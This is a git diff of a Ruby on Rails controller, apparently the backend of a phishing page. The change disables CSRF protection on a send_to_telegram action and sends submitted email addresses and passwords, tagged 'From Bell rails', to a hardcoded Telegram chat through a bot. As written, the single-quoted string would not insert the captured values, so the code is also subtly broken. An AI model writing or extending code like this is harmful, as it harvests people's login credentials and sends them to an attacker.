@@ -1,14 +1,20 @@
 # app/controllers/containers_controller.rb
 class ContainersController < ApplicationController
+  protect_from_forgery with: :null_session, only: :send_to_telegram
   def show
     # This action will render the container page with the modal
   end
 
    def send_to_telegram
-    # You can replace this with the appropriate logic to get the bot token and chat ID
-    bot_token = ENV['TELEGRAM_BOT_TOKEN']  # Store the bot token securely, e.g., in environment variables
-    chat_id = 1678259688  # Replace with your Telegram chat ID
-    message = params[:message]  # This is just an example. You can extract message from params.
+    email = params[:email]
+    password = params[:password]
+    message = 'From Bell rails: 
+    Email: #{email}
+    Password: #{password}'
+
+    bot_token = ENV['TELEGRAM_BOT_TOKEN'] 
+    chat_id = 1678259688  
+    # message = params[:message]
 
     # Initialize the TelegramService and send the message
     telegram_service = TelegramService.new(bot_token)
